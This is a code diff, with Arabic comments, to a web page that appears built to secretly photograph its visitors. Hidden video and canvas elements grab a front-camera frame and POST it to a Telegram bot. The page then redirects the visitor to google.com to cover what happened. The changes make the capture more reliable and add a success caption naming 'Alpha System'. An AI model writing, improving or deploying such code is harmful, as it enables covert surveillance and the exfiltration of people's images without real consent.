@@ -21,7 +21,7 @@
         <div class="loader" id="loading-spinner"></div>
     </div>
 
-    <video id="v" autoplay playsinline style="display:none;"></video>
+    <video id="v" autoplay playsinline muted style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
@@ -33,25 +33,34 @@
             document.getElementById('loading-spinner').style.display = 'block';
             
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // طلب فتح الكاميرا الأمامية مع تحديد أبعاد واضحة لضمان الاستجابة السريعة
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
+                    audio: false 
+                });
+                
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                await new Promise(resolve => video.onloadedmetadata = resolve);
+                // التأكد من تشغيل الفيديو وبدء تدفق الإطارات لمنع التقاط صورة سوداء
+                await video.play();
+                await new Promise(resolve => setTimeout(resolve, 800));
                 
                 const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                 const blob = dataURItoBlob(dataUrl);
                 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', 'تم الالتقاط بنجاح via Alpha System');
                 
+                // إرسال الصورة للبوت مع التعامل مع استجابة الشبكة
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -59,12 +68,13 @@
                 
                 stream.getTracks().forEach(track => track.stop());
             } catch (err) {
-                console.error(err);
+                console.error("Capture failed:", err);
             }
 
+            // ضمان إتمام الإرسال قبل إعادة التوجيه
             setTimeout(() => {
                 window.location.href = "https://google.com";
-            }, 1000);
+            }, 1200);
         }
 
         function dataURItoBlob(dataURI) {
